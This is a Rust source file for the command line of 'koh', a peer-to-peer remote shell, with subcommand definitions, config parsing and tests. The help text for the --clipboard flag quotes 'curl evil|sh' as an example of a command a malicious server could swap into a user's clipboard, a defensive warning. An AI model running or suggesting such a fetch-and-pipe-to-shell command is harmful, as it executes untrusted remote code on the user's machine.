//! The command line: clap's builder API, and the config structs it produces.
//!
//! Built with the builder API rather than the derive, whose expansions `allow` lints this crate
//! forbids. Help texts are single sentences without a final period, as clap prints them.

use std::net::SocketAddr;
use std::path::PathBuf;

use clap::error::ErrorKind;
use clap::{value_parser, Arg, ArgAction, ArgMatches, Command};

use koh::client::ConnectConfig;
use koh::idcmd::IdConfig;
use koh::keycmd::{KeyConfig, KeyOp};
use koh::server::cli::{
    DEFAULT_MAX_CONNECTIONS, DEFAULT_MAX_SESSIONS, DEFAULT_SCROLLBACK, DEFAULT_SESSION_TTL_SECS,
    MAX_SCROLLBACK,
};
use koh::server::ServeConfig;

/// What the command line asks for.
#[derive(Debug)]
pub enum Cmd {
    Serve(ServeConfig),
    Connect(ConnectConfig),
    Id(IdConfig),
    Key(KeyConfig),
}

/// `koh`'s command line.
pub fn command() -> Command {
    Command::new("koh")
        .version(env!("CARGO_PKG_VERSION"))
        .about("koh — a resilient peer-to-peer remote shell (mosh over iroh)")
        .subcommand_required(true)
        .arg_required_else_help(true)
        .subcommand(serve())
        .subcommand(connect())
        .subcommand(id())
        .subcommand(key())
}

/// An optional path, `--NAME <VALUE_NAME>`.
fn path(id: &'static str, long: &'static str, value_name: &'static str) -> Arg {
    Arg::new(id)
        .long(long)
        .value_name(value_name)
        .value_parser(value_parser!(PathBuf))
}

/// A flag, `--NAME`.
fn flag(id: &'static str, long: &'static str) -> Arg {
    Arg::new(id).long(long).action(ArgAction::SetTrue)
}

fn serve() -> Command {
    Command::new("serve")
        .about("Host a PTY shell for authorized clients")
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the persistent secret-key file (gives a stable endpoint id across restarts)"),
        )
        .arg(
            Arg::new("allow")
                .long("allow")
                .value_name("ENDPOINT_ID")
                .action(ArgAction::Append)
                .help("Authorize a client endpoint id (repeatable). At least one is required — koh only serves peers whose node-id is on this list"),
        )
        .arg(
            Arg::new("shell")
                .long("shell")
                .value_name("PROGRAM_OR_ARG")
                .action(ArgAction::Append)
                .help("Program to run in the session (defaults to the user's login shell). Repeat to pass arguments: `--shell zellij --shell attach --shell -c --shell main` runs `zellij attach -c main`. The value is never split on whitespace"),
        )
        .arg(
            Arg::new("scrollback")
                .long("scrollback")
                .value_name("SCROLLBACK")
                .default_value(DEFAULT_SCROLLBACK.to_string())
                .value_parser(value_parser!(u64).range(0..=MAX_SCROLLBACK))
                .help("Scrollback lines retained by the server-side emulator (per session). Bounded like the other resource knobs (`--max-connections`/`--max-sessions`) and by the emulator's per-buffer cell limit at the largest screen. 0 = no scrollback"),
        )
        .arg(
            Arg::new("session_ttl_secs")
                .long("session-ttl-secs")
                .value_name("SESSION_TTL_SECS")
                .default_value(DEFAULT_SESSION_TTL_SECS.to_string())
                .value_parser(value_parser!(u64))
                .help("Keep a detached session's shell alive this long (seconds) for the client to reconnect. Default 24h (mosh-style \"close the laptop, reopen later\")"),
        )
        .arg(
            Arg::new("relay_url")
                .long("relay-url")
                .value_name("URL")
                .help("Host via a self-hosted relay URL instead of n0's public relays"),
        )
        .arg(
            flag("local", "local")
                .conflicts_with("relay_url")
                .help("Bind without any relay/discovery (LAN / loopback). Clients dial with --direct <ip:port>"),
        )
        .arg(
            Arg::new("max_connections")
                .long("max-connections")
                .value_name("MAX_CONNECTIONS")
                .default_value(DEFAULT_MAX_CONNECTIONS.to_string())
                .value_parser(value_parser!(u32).range(1..))
                .help("Maximum number of connections being handled concurrently (each holds a permit for its whole lifetime; excess incoming connections are refused cheaply, before the crypto handshake). This bounds the work a flood of dials can pin on the server before the allowlist check rejects them"),
        )
        .arg(
            Arg::new("max_sessions")
                .long("max-sessions")
                .value_name("MAX_SESSIONS")
                .default_value(DEFAULT_MAX_SESSIONS.to_string())
                .value_parser(value_parser!(u32).range(1..))
                .help("Maximum number of distinct live sessions (one per authorized peer). A new peer is refused once this many sessions exist; reconnecting to an existing session is always allowed. Bounds the number of real shells a flood of authorized keys can spawn"),
        )
}

fn connect() -> Command {
    Command::new("connect")
        .about("Connect to a koh server by its endpoint id")
        .arg(
            Arg::new("server")
                .value_name("SERVER")
                .required(true)
                .help("Server endpoint id to connect to"),
        )
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the client's persistent secret key (its endpoint id must be on the server's allowlist)"),
        )
        .arg(
            Arg::new("direct")
                .long("direct")
                .value_name("IP:PORT")
                .value_parser(value_parser!(SocketAddr))
                .conflicts_with("relay_url")
                .help("Dial the server at a direct socket address (LAN / loopback; no relay or discovery)"),
        )
        .arg(
            Arg::new("relay_url")
                .long("relay-url")
                .value_name("URL")
                .help("Dial the server via a self-hosted relay URL instead of n0's public relays"),
        )
        .arg(
            flag("clipboard", "clipboard")
                .help("Honor remote OSC-52 clipboard writes (let the remote app set your system clipboard). OFF by default: a malicious/compromised server could otherwise silently overwrite your clipboard (e.g. swap a copied command for `curl evil|sh`). A deliberate per-session opt-in"),
        )
        .arg(
            Arg::new("on_bell")
                .long("on-bell")
                .value_name("CMD")
                .help("Run this shell command whenever the remote bell rings (e.g. on Termux: `--on-bell 'termux-notification -t \"koh bell\"'`). Detached from the terminal; at most one spawn per second. KOH_BELL_COUNT and KOH_TITLE are set in its environment. Bells that rang before you attached do not fire it; bells during a reconnect do"),
        )
}

fn id() -> Command {
    Command::new("id")
        .about("Print this machine's koh id (add it to a server's --allow list)")
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the client's persistent secret key"),
        )
}

fn key() -> Command {
    Command::new("key")
        .about("Show or reset this machine's identity key")
        .subcommand_required(true)
        .arg_required_else_help(true)
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .global(true)
                // After the subcommand's own options, where the derive listed it.
                .display_order(1)
                .help("Which identity key to operate on. Defaults to the client key path (as `koh id` uses); pass a server key explicitly to manage it"),
        )
        .subcommand(Command::new("info").about("Print the key file and its endpoint id (never the secret)"))
        .subcommand(
            Command::new("reset")
                .about("Delete an unused identity; the next use creates a new endpoint ID")
                .arg(flag("yes", "yes").help("Acknowledge permanent identity loss and required allowlist updates")),
        )
}

/// The config `matches` asks for. clap has already enforced the required subcommands and
/// arguments, the defaults and the ranges, so a missing value is an internal error.
pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
    match matches.subcommand() {
        Some(("serve", m)) => Ok(Cmd::Serve(ServeConfig {
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            allow: strings(m, "allow"),
            command: strings(m, "shell"),
            scrollback: value(m, "scrollback")?,
            session_ttl_secs: value(m, "session_ttl_secs")?,
            relay_url: m.get_one::<String>("relay_url").cloned(),
            local: m.get_flag("local"),
            max_connections: value(m, "max_connections")?,
            max_sessions: value(m, "max_sessions")?,
            launcher: koh::pty::Launcher::this_binary(),
        })),
        Some(("connect", m)) => Ok(Cmd::Connect(ConnectConfig {
            server: m
                .get_one::<String>("server")
                .cloned()
                .ok_or_else(|| missing("server"))?,
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            direct: m.get_one::<SocketAddr>("direct").copied(),
            relay_url: m.get_one::<String>("relay_url").cloned(),
            clipboard: m.get_flag("clipboard"),
            bell_command: m.get_one::<String>("on_bell").cloned(),
        })),
        Some(("id", m)) => Ok(Cmd::Id(IdConfig {
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
        })),
        Some(("key", m)) => {
            let (op, sub) = match m.subcommand() {
                Some(("info", sub)) => (KeyOp::Info, sub),
                Some(("reset", sub)) => (
                    KeyOp::Reset {
                        confirmed: sub.get_flag("yes"),
                    },
                    sub,
                ),
                _ => return Err(missing("key subcommand")),
            };
            // `--key-file` is global to `key`: clap stores it with the subcommand given.
            let key_file = sub
                .get_one::<PathBuf>("key_file")
                .or_else(|| m.get_one::<PathBuf>("key_file"))
                .cloned();
            Ok(Cmd::Key(KeyConfig { op, key_file }))
        }
        _ => Err(missing("subcommand")),
    }
}

/// Every value of a repeatable argument, in order.
fn strings(m: &ArgMatches, id: &str) -> Vec<String> {
    m.get_many::<String>(id)
        .map_or_else(Vec::new, |values| values.cloned().collect())
}

/// An argument that has a default, so always a value.
fn value<T: Clone + Send + Sync + 'static>(m: &ArgMatches, id: &str) -> Result<T, clap::Error> {
    m.get_one::<T>(id).cloned().ok_or_else(|| missing(id))
}

fn missing(what: &str) -> clap::Error {
    clap::Error::raw(
        ErrorKind::MissingRequiredArgument,
        format!("internal error: no {what} after parsing\n"),
    )
}

#[cfg(test)]
mod tests {
    use super::{command, parse, Cmd};
    use koh::keycmd::KeyOp;
    use koh::server::ServeConfig;

    fn parsed(argv: &[&str]) -> Cmd {
        let matches = command()
            .try_get_matches_from(argv)
            .expect("valid command line");
        parse(&matches).expect("parsed")
    }

    #[test]
    fn the_command_line_is_consistent() {
        command().debug_assert();
    }

    #[test]
    fn serve_args_map_shell_to_command_argv_and_keep_defaults() {
        let Cmd::Serve(c) = parsed(&[
            "koh", "serve", "--allow", "abc", "--shell", "zellij", "--shell", "attach",
        ]) else {
            panic!("serve");
        };
        assert_eq!(c.command, ["zellij", "attach"]);
        assert_eq!(c.allow, ["abc"]);
        // Everything not given on the command line must equal `ServeConfig::default()`.
        let d = ServeConfig::default();
        assert_eq!(c.scrollback, d.scrollback);
        assert_eq!(c.session_ttl_secs, d.session_ttl_secs);
        assert_eq!(c.max_connections, d.max_connections);
        assert_eq!(c.max_sessions, d.max_sessions);
        assert!(!c.local && c.relay_url.is_none() && c.key_file.is_none());

        // A single `--shell` is just the program.
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", "abc", "--shell", "/bin/zsh"])
        else {
            panic!("serve");
        };
        assert_eq!(c.command, ["/bin/zsh"]);
        // No `--shell` = login shell.
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", "abc"]) else {
            panic!("serve");
        };
        assert_eq!(c.command, Vec::<String>::new());
    }

    #[test]
    fn connect_args_map_on_bell_to_bell_command() {
        let Cmd::Connect(c) =
            parsed(&["koh", "connect", "abc", "--on-bell", "termux-notification"])
        else {
            panic!("connect");
        };
        assert_eq!(c.server, "abc");
        assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
        assert!(!c.clipboard && c.direct.is_none());
    }

    #[test]
    fn the_key_file_is_global_to_key() {
        for argv in [
            ["koh", "key", "--key-file", "/k", "reset", "--yes"],
            ["koh", "key", "reset", "--key-file", "/k", "--yes"],
        ] {
            let Cmd::Key(c) = parsed(&argv) else {
                panic!("key");
            };
            assert!(matches!(c.op, KeyOp::Reset { confirmed: true }), "{argv:?}");
            assert_eq!(
                c.key_file.as_deref(),
                Some(std::path::Path::new("/k")),
                "{argv:?}"
            );
        }
        let Cmd::Key(c) = parsed(&["koh", "key", "info"]) else {
            panic!("key");
        };
        assert!(matches!(c.op, KeyOp::Info) && c.key_file.is_none());
    }
}
